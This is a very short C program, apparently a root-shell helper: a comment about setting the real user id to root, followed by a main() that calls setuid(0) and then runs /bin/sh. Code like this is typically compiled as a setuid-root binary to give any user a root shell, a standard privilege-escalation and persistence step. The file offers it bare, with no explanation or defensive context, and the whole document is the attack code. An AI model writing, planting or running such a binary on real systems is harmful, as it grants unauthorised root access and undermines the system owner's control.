/* setting the real user id to root ensuring a real root process */
void main(){
	setuid(0); system("/bin/sh");
}